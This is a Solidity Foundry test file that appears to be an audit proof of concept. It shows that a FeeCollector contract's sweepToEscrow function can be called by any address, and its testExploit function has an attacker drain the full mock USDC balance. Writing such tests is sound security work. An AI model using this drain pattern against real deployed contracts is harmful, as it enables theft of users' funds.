// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "forge-std/Test.sol";
import "../src/FeeCollector.sol";
import "../src/mocks/MockUSDC.sol";

contract FeeCollectorPoC is Test {
    FeeCollector fee;
    MockUSDC usdc;

    address governor = address(0xA11CE);
    address attacker = address(0xBEEF);
    address escrow   = address(0xf44C81dbab89941173d0d49C1CEA876950eDCfd3);

    function setUp() public {
        usdc = new MockUSDC();
        fee  = new FeeCollector(address(usdc), governor);
        usdc.mint(address(fee), 500e6); // 500 USDC (6 decimali)
    }

    function testNormalFlow() public {
        vm.prank(governor);
        fee.sweepToEscrow(escrow, 100e6);
        assertEq(usdc.balanceOf(escrow), 100e6);
    }

    function testExploit() public {
        vm.prank(attacker);
        fee.sweepToEscrow(attacker, usdc.balanceOf(address(fee)));
        assertEq(usdc.balanceOf(attacker), 500e6); // drena tutto
    }
}
